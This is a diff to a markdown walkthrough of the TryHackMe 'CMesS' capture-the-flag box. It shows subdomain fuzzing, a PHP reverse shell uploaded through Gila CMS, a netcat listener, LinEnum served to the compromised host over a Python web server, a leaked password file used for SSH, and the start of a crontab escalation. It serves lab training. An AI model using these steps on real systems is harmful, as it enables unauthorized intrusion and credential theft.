@@ -1,4 +1,4 @@
-In this walkthrough, we'll go over a challenge (intermediate) level box called "CMesS". CMesS is one of the Linux Privesc boxes on [TryHackMe](https://tryhackme.com/room/cmess).
+In this walkthrough, we'll go over a challenge (intermediate) level box called "CMesS". CMesS is one of the Linux Privesc boxes on [TryHackMe](https://tryhackme.com/room/cmess) and it was also one of the challenges from [TCM's Linux Privilege Escalation Course on Udemy](https://www.udemy.com/course/linux-privilege-escalation-for-beginners/).
 
 ![CMesS](CMesS.png)
 ![CMesS IP](CMesS-IP.png)
@@ -31,7 +31,7 @@ It looks like we have exhausted every option, on my end I also went through ever
 ```bash
 wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hl 107 -H "Host: FUZZ.cmess.thm" -u http://cmess.thm -t 100
 ```
-![CMesS wfuzz](wfuzz.png)
+![CMesS wfuzz](CMesS-wfuzz.png)
 
 As we can see there is another domain "dev", let's add that to our /etc/hosts file and try to visit the site:
 
@@ -64,3 +64,32 @@ Let's change the file name to "php-revshell.php" on the Gila site:
 Turn off the proxy and start a netcat listener on our Kali machine ```nc -nlvp 1234``` Now, all we need to do this is visiting cmess.thm/assets/php-revshell.php If all goes well, we should receive a reverse shell back:
 
 ![Gila initial foothold](Gila-initial-foothold.png)
+
+From this point on, I decided to use LinEnum from https://github.com/rebootuser/LinEnum. I always save Github scripts to my opt directory so I started a Python server and brought it over the compromised machine, but before let's upgrade our shell with python3:
+
+![Which Python](CMesS-Which-Python.png)
+```bash
+/usr/bin/python3 -c 'import pty;pty.spawn("/bin/bash");'
+```
+```bash
+sudo python3 -m http.server 1111
+```
+And you can use wget on the target machine to download it. After downloading, make sure that it is executable ```chmod +x LinEnum.sh```. Now, we are ready to run LinEnum ```./LinEnum.sh```
+
+If we look at the output, the first thing we see is a password.bak file which we have read right to it:
+
+![LinEnum output](CMesS-LinEnum-output.png)
+
+```cat /opt/.password.bak```
+
+![Password Content](CMesS-Password-Content.png)
+
+We know that port 22 is open which is SSH so let's try to ssh into the machine with andres password:
+```bash
+ssh andres@cmess.thm
+```
+![SSH into](CMesS-SSH-Into.png)
+
+It worked and we can also see ```user.txt``` file which has the user flag. Last task remaining is to become root. I am again running LinEnum to see if I can find anything interesting that can be used to escalate privileges.
+
+![LinEnum-Crontab](CMesS-LinEnum-Crontab.png)
